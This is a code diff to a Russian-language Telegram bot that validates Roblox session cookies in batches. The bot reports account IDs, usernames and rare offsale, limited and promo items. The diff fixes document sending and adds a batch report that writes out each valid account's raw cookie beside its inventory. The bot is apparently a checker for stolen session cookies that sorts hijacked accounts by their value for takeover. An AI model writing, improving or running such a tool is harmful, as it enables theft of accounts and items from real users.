@@ -8,7 +8,8 @@ from aiogram.filters import CommandStart, Command
 from aiogram.types import (
     Message, CallbackQuery,
     InlineKeyboardMarkup, InlineKeyboardButton,
-    LinkPreviewOptions
+    LinkPreviewOptions,
+    BufferedInputFile  # <-- добавлен необходимый импорт
 )
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -550,7 +551,7 @@ def build_report(result):
 
 
 # ================================================================
-#  ОДИНОЧНАЯ ПРОВЕРКА
+#  ОДИНОЧНАЯ ПРОВЕРКА (исправлена отправка документа)
 # ================================================================
 
 async def run_check(message, cookie, show_debug=False):
@@ -580,8 +581,8 @@ async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False):
     if len(report) > 3800:
         await status_msg.delete()
         buf = io.BytesIO(report.encode("utf-8"))
-        buf.name = "report_{}.txt".format(result["user_id"])
-        await message.answer_document(buf, caption="📋 {}".format(result["username"]))
+        file = BufferedInputFile(buf.getvalue(), filename=f"report_{result['user_id']}.txt")
+        await message.answer_document(file, caption="📋 {}".format(result["username"]))
     else:
         await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))
     if show_debug or result["inv_total"] == 0:
@@ -590,8 +591,8 @@ async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False):
             await message.answer(dbg)
         else:
             buf2 = io.BytesIO(("\n".join(result["debug"])).encode("utf-8"))
-            buf2.name = "debug_{}.txt".format(result.get("user_id", "unknown"))
-            await message.answer_document(buf2, caption="🛠 Лог")
+            file2 = BufferedInputFile(buf2.getvalue(), filename=f"debug_{result.get('user_id', 'unknown')}.txt")
+            await message.answer_document(file2, caption="🛠 Лог")
 
 
 # ================================================================
@@ -610,7 +611,7 @@ async def _silent_check(cookie):
 
 
 # ================================================================
-#  БАТЧЕВАЯ ПРОВЕРКА (ФИНАЛЬНАЯ ВЕРСИЯ)
+#  БАТЧЕВАЯ ПРОВЕРКА (исправлена отправка документов)
 # ================================================================
 
 async def run_batch(message, cookies):
@@ -691,10 +692,51 @@ async def run_batch(message, cookies):
             file_lines.append("")
         txt = "\n".join(file_lines)
         buf = io.BytesIO(txt.encode("utf-8"))
-        buf.name = "accounts_with_items.txt"
-        await message.answer_document(buf, caption=f"📋 Найдено аккаунтов с предметами: {len(hits)}")
+        file = BufferedInputFile(buf.getvalue(), filename="accounts_with_items.txt")
+        await message.answer_document(file, caption=f"📋 Найдено аккаунтов с предметами: {len(hits)}")
     else:
         await message.answer("❌ Аккаунтов с находками нет.")
+
+    # ── Всегда шлём txt файл с полным отчётом ──
+    if valid_pairs:
+        file_lines = [
+            "ОТЧЁТ ПРОВЕРКИ",
+            "=" * 60,
+            "Всего: {} | Валид: {} | Невалид: {} | Дубли: {}".format(
+                total, counter["valid"], counter["invalid"], dupes),
+            "",
+        ]
+
+        for r, cookie in valid_pairs:
+            uid, uname = r["user_id"], r["username"]
+            file_lines.append("=" * 60)
+            file_lines.append(f"Аккаунт: {uname} (ID: {uid})")
+            file_lines.append(f"Ссылка: https://www.roblox.com/users/{uid}/profile")
+            file_lines.append(f"Куки: {cookie}")
+            file_lines.append("")
+            if r["offsale"]:
+                file_lines.append(f"ОФФСЕЙЛ ({len(r['offsale'])} шт.):")
+                for it in r["offsale"]:
+                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
+                    file_lines.append(f"  {it['name']} ({it['year'] or '?'}) — https://www.roblox.com/catalog/{it['id']}{badge}")
+            else:
+                file_lines.append("Оффсейл: не найдено")
+            file_lines.append("")
+            if r["promo_found"]:
+                file_lines.append(f"ПРОМО ({len(r['promo_found'])} шт.):")
+                for it in r["promo_found"]:
+                    file_lines.append(f"  {it['name']} — https://www.roblox.com/catalog/{it['id']}")
+            else:
+                file_lines.append("Промо: не найдено")
+            file_lines.append("")
+
+        txt = "\n".join(file_lines)
+        buf = io.BytesIO(txt.encode("utf-8"))
+        file = BufferedInputFile(buf.getvalue(), filename=f"report_{len(valid_pairs)}_accs.txt")
+        await message.answer_document(
+            file,
+            caption=f"📋 {len(valid_pairs)} валидных аккаунтов | {len(hits)} с находками"
+        )
 
 
 # ================================================================
